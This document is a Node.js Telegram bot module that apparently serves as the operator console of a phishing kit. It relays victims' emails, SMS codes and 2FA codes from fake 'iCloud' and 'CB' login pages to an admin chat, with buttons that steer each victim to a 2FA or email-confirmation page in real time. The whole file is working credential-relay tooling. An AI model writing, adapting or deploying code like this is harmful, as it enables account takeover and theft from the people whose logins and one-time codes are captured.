const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID;
const APP_URL = process.env.APP_URL;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
  console.error("❌ Missing BOT_TOKEN, ADMIN_CHAT_ID/CHAT_ID, or APP_URL in environment");
  process.exit(1);
}

// Initialize bot — polling with timeout to reduce conflicts
const bot = new TelegramBot(BOT_TOKEN, {
  polling: {
    autoStart: true,
    params: {
      timeout: 10
    }
  }
});

bot.getMe().then(() => {
  console.log("✅ Bot connected successfully.");
}).catch(err => {
  console.error("❌ Bot connection failed:", err.message);
});

// Suppress 409 polling errors and auto-restart after delay
bot.on("polling_error", (err) => {
  if (err.code === "ETELEGRAM" && err.message.includes("409 Conflict")) {
    console.warn("⚠️ Polling conflict — another instance may be running. Restarting in 5s...");
    bot.stopPolling().then(() => {
      setTimeout(() => bot.startPolling(), 5000);
    });
  } else {
    console.error("❌ Polling error:", err.message);
  }
});

// Track pending 2FA requests per chatId
let pendingRequests = {};

// -----------------
// Email/Password approval
// -----------------
function sendApprovalRequest(email, password) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${email}` },
          { text: "❌ Reject", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  bot.sendMessage(
    ADMIN_CHAT_ID,
    `*Login Approval Requested*\n*Email:* ${email}`,
    { ...options, parse_mode: "Markdown" }
  );
}

// -----------------
// Generic code approval
// -----------------
function sendApprovalRequestGeneric(identifier) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${identifier}` },
          { text: "❌ Reject", callback_data: `reject|${identifier}` }
        ]
      ]
    }
  };
  bot.sendMessage(
    ADMIN_CHAT_ID,
    `*Approval Requested*\nIdentifier: ${identifier}`,
    { ...options, parse_mode: "Markdown" }
  );
}

// -----------------
// SMS code approval
// -----------------
function sendApprovalRequestSMS(code) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${code}` },
          { text: "❌ Reject", callback_data: `reject|${code}` }
        ]
      ]
    }
  };
  bot.sendMessage(
    ADMIN_CHAT_ID,
    `*SMS Approval Requested*\n*Code:* ${code}`,
    { ...options, parse_mode: "Markdown" }
  );
}

// -----------------
// iCloud Login approval
// -----------------
function sendApprovalRequestPage(email, password) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${email}` },
          { text: "❌ Reject", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  bot.sendMessage(
    ADMIN_CHAT_ID,
    `*iCloud Login Approval Requested*\n*Email:* ${email}`,
    { ...options, parse_mode: "Markdown" }
  );
}

// -----------------
// CB Login approval
// -----------------
async function sendLoginTelegram(email) {
  const options = {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "↖️ 2FA", callback_data: `page1|${email}` },
          { text: "↗️ Email Confirmation", callback_data: `page2|${email}` }
        ],
        [
          { text: "⚠️❌ REJECT ❌⚠️", callback_data: `reject|${email}` }
        ]
      ]
    }
  };

  const message = `📧 *Email:* ${email}`;
  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
}

// -----------------
// 2FA Code sender (keyboard-based Accept/Reject)
// -----------------
function send2FACode(code, chatId) {
  pendingRequests[chatId] = true;
  bot.sendMessage(chatId, `Your 2FA code is: ${code}`, {
    reply_markup: {
      keyboard: [["Accept", "Reject"]],
      one_time_keyboard: true,
    },
  });
}

// -----------------
// Handle plain text messages (2FA keyboard Accept/Reject)
// -----------------
bot.on("message", (msg) => {
  const chatId = msg.chat.id;

  if (pendingRequests[chatId]) {
    if (msg.text === "Accept") {
      bot.sendMessage(chatId, "✅ 2FA code accepted. Redirecting...");
      delete pendingRequests[chatId];
    } else if (msg.text === "Reject") {
      bot.sendMessage(chatId, "❌ 2FA code rejected. Please try again.");
      delete pendingRequests[chatId];
    }
  }
});

// -----------------
// Handle inline button callbacks
// -----------------
bot.on("callback_query", async (query) => {
  try {
    const [action, identifier] = query.data.split("|");
    let status;

    // --- Handle 2FA approve/reject separately ---
    if (action === "2fa_approve" || action === "2fa_reject") {
      const twoFaStatus = action === "2fa_approve" ? "approved" : "rejected";

      await fetch(`${APP_URL}/api/update-2fa-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId: identifier, status: twoFaStatus })
      });

      try {
        await bot.editMessageText(
          `🔐 2FA Request <b>${identifier}</b> has been <b>${twoFaStatus.toUpperCase()}</b>`,
          {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id,
            parse_mode: "HTML"
          }
        );
      } catch (_) {}

      await bot.answerCallbackQuery(query.id, { text: `❗️${twoFaStatus.toUpperCase()}❗️` });
      return;
    }

    // --- Handle all other approvals ---
    if (action === "accept") status = "accepted";
    else if (action === "page1") status = "accepted1";
    else if (action === "page2") status = "accepted2";
    else status = "rejected";

    // Notify backend
    await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: identifier, identifier, status })
    });

    // Try HTML first, fallback to Markdown
    try {
      await bot.editMessageText(
        `🔐 <b>${identifier}</b> has been <b>${status.toUpperCase()}</b>`,
        {
          chat_id: query.message.chat.id,
          message_id: query.message.message_id,
          parse_mode: "HTML"
        }
      );
    } catch {
      await bot.editMessageText(
        `🔐 ${identifier} has been *${status.toUpperCase()}*`,
        {
          chat_id: query.message.chat.id,
          message_id: query.message.message_id,
          parse_mode: "Markdown"
        }
      );
    }

    await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });

  } catch (err) {
    console.error("❌ Failed to handle callback:", err);
    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval`);
  }
});

// -----------------
// Commands
// -----------------
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for approvals.\nPlease enter your 2FA code if prompted.");
});

bot.onText(/\/startcb/, (msg) => {
  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for CB login approvals.");
});

module.exports = {
  bot,
  sendApprovalRequest,
  sendApprovalRequestGeneric,
  sendApprovalRequestSMS,
  sendApprovalRequestPage,
  sendLoginTelegram,
  send2FACode
};
